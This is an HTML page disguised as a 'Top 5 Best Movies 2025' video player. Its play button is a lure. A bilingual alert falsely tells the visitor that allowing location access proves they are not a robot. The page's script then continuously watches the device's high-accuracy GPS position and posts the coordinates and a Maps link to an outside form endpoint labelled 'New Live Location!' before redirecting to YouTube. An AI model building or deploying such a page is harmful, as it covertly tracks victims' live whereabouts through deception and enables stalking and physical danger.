<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Top 5 Best Movies 2025</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
    }
    .video-area {
      flex: 3;
      padding: 30px;
      text-align: center;
    }
    .video-area h1 {
      font-size: 24px;
      text-align: left;
    }
    .video-placeholder {
      width: 100%;
      max-width: 640px;
      height: 360px;
      background: url('https://i.imgur.com/gI7ZKjN.jpeg') center center no-repeat;
      background-size: cover;
      margin: 20px auto;
      position: relative;
      cursor: pointer;
    }
    .play-icon {
      width: 0;
      height: 0;
      border-left: 30px solid red;
      border-top: 20px solid transparent;
      border-bottom: 20px solid transparent;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }
    .sidebar {
      flex: 1;
      background-color: #e0e0e0;
      padding: 20px;
    }
    .sidebar h2 {
      font-size: 18px;
      margin-bottom: 10px;
    }
    .sidebar ul {
      list-style-type: none;
      padding: 0;
    }
    .sidebar li {
      margin-bottom: 10px;
      background: white;
      padding: 10px;
      border-radius: 4px;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="video-area">
    <h1>Top 5 Best Movies 2025</h1>
    <div class="video-placeholder" onclick="startVideo()">
      <div class="play-icon"></div>
    </div>
  </div>
  <div class="sidebar">
    <h2>Recommended:</h2>
    <ul>
      <li>Action Trailer</li>
      <li>Comedy Highlights</li>
      <li>Drama Picks</li>
      <li>Sci-Fi Previews</li>
    </ul>
  </div>

  <script>
    function startVideo() {
      alert("🎥 لتتمكن من مشاهدة الفيديو، يرجى السماح بتحديد موقعك للتأكد أنك لست روبوت.\nTo watch the video, please allow location access to verify you're not a robot 🤖");

      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(
          function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const mapsLink = `https://maps.google.com/maps?q=${latitude},${longitude}`;
            const data = {
              location: `Latitude: ${latitude}, Longitude: ${longitude}`,
              maps: mapsLink,
              _subject: "📍 New Live Location!"
            };

            fetch("https://formspree.io/f/xkgjqegp", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(data)
            });

            setTimeout(() => {
              window.location.href = "https://www.youtube.com";
            }, 3000);
          },
          function(error) {
            alert("تعذر تحميل الصورة، يرجى المحاولة لاحقاً.\nImage failed to load, please try again later.");
          },
          {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 10000
          }
        );
      } else {
        alert("الموقع غير مدعوم على هذا الجهاز.");
      }
    }
  </script>
</body>
</html>
